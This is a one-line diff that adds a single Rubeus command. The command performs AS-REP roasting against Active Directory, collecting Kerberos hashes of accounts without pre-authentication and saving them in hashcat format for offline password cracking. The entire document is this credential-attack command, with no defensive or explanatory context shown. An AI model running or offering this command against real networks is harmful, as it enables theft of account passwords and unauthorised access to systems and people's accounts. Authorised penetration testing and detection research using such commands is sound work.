@@ -1,0 +1,1 @@
+Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
